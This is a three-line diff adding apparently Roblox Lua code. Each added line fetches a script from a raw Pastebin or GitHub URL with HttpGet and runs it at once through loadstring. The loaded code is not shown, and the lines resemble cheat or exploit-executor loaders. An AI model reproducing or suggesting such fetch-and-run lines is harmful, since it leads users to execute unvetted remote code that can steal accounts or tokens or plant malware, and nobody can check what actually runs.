@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/20"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/vzffWTq4", true))();
+loadstring(game:HttpGet("https://pastebin.com/raw/NHXHxHzY", true))();
